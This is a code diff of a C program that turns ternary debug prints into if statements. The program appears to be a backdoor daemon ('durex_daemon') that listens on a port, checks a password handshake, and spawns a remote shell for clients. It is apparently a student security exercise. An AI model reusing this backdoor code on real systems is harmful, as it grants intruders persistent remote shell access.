@@ -16,7 +16,7 @@ void handle_signals(int signum)
 {
 	if (signum == SIGCHLD || signum == SIGHUP)
 		return ;
-	(DEBUG) ? printf("error %d signal in payload\n", signum) : 0;
+	if (DEBUG) printf("error %d signal in payload\n", signum);
 	exit(EXIT_FAILURE);
 }
 
@@ -102,27 +102,27 @@ int setup_server(env_t *env, struct sockaddr_in *server_address)
     env->master_sd = socket(AF_INET, SOCK_STREAM, 0);
 	if (env->master_sd < 0)
 	{
-		(DEBUG) ? printf("error opening socket\n") : 0;
+		if (DEBUG) printf("error opening socket\n");
 		return -1;
 	}
 	// set socket options
 	if (setsockopt(env->master_sd, SOL_SOCKET, SO_REUSEADDR | SO_REUSEPORT, &opt, sizeof(opt)))
     {
-        (DEBUG) ? printf("error setting socket options\n") : 0;
+        if (DEBUG) printf("error setting socket options\n");
 		close(env->master_sd);
 		return -1;
     }
 	// bind socket to if
     if (bind(env->master_sd, (const struct sockaddr *)server_address, sizeof(*server_address)))
 	{
-		(DEBUG) ? printf("error binding socket\n") : 0;
+		if (DEBUG) printf("error binding socket\n");
 		close(env->master_sd);
 		return -1;
 	}
 	// listen for connexions
 	if (listen(env->master_sd, env->nb_clients) < 0)
 	{
-		(DEBUG) ? printf("error listening socket\n") : 0;
+		if (DEBUG) printf("error listening socket\n");
 		close(env->master_sd);
 		return -1;
 	}
@@ -157,8 +157,8 @@ int handle_connexions(env_t *env)
 	{
 		if ((new_socket = accept(env->master_sd, (struct sockaddr *)&client_address, &client_addr_size)) < 0)  
 		{
-			(DEBUG) ? printf("error accepting connexion\n") : 0;
-			(DEBUG) ? printf("%s\n", strerror(errno)) : 0;
+			if (DEBUG) printf("error accepting connexion\n");
+			if (DEBUG) printf("%s\n", strerror(errno));
 			return -1;
 		}
 		//add new socket to array of sockets 
@@ -180,7 +180,7 @@ int handle_connexions(env_t *env)
 		//printf("New connection , socket fd is %d , ip is : %s , port : %d\n", new_socket, inet_ntoa(client_address.sin_addr), ntohs(client_address.sin_port));  
 		if (generate_handshake(handshake))
 		{
-			(DEBUG) ? printf("error generating random handshake\n") : 0;
+			if (DEBUG) printf("error generating random handshake\n");
 			close(env->master_sd);
 			return -1;
 		}
@@ -188,14 +188,14 @@ int handle_connexions(env_t *env)
 		// check password
 		if (read(env->clients_sockets[i], buffer, 1025) < 0)
 		{
-			(DEBUG) ? printf("error reading socket content\n") : 0;
+			if (DEBUG) printf("error reading socket content\n");
 			close(env->master_sd);
 			return -1;
 		}
 		buffer[16] = 0;
 		if (rabbit(handshake, env->key))
 		{
-			(DEBUG) ? printf("error encrypting handshake\n") : 0;
+			if (DEBUG) printf("error encrypting handshake\n");
 			close(env->master_sd);
 			return -1;
 		}
@@ -230,7 +230,7 @@ int spawn_shell(int *clients_sockets)
 	shell_pid = fork();
 	if (shell_pid < 0)
 	{
-		(DEBUG) ? printf("error fork failed\n") : 0;
+		if (DEBUG) printf("error fork failed\n");
 		exit(EXIT_FAILURE);
 	}
 	if (shell_pid == 0)
@@ -251,14 +251,14 @@ int spawn_shell(int *clients_sockets)
 	wait_args_t *args;
 	if ((args = malloc(sizeof(wait_args_t))) == NULL)
 	{
-		(DEBUG) ? printf("error malloc failed\n") : 0;
+		if (DEBUG) printf("error malloc failed\n");
 		exit(EXIT_FAILURE);
 	}
 	args->pid = shell_pid;
 	args->clients_sockets = clients_sockets;
 	if (pthread_create(&thread, NULL, wait_child, args) < 0)
 	{
-		(DEBUG) ? printf("error pthread_create failed\n") : 0;
+		if (DEBUG) printf("error pthread_create failed\n");
 		exit(EXIT_FAILURE);
 	}
 	return 0;
@@ -411,7 +411,7 @@ int main(void)
 
 	if ((env = malloc(sizeof(env_t))) == NULL)
 	{
-		(DEBUG) ? printf("error malloc failed\n") : 0;
+		if (DEBUG) printf("error malloc failed\n");
 		return EXIT_FAILURE;
 	}
 	memset(env->key, 0, 17);
@@ -420,7 +420,7 @@ int main(void)
 
 	if (daemonize("durex_daemon", "/", "/dev/fd/0", "/dev/fd/1", "/dev/fd/2"))
 	{
-		(DEBUG) ? printf("error failed to run daemon\n") : 0;
+		if (DEBUG) printf("error failed to run daemon\n");
 		return EXIT_FAILURE;
 	}
 	while (1)
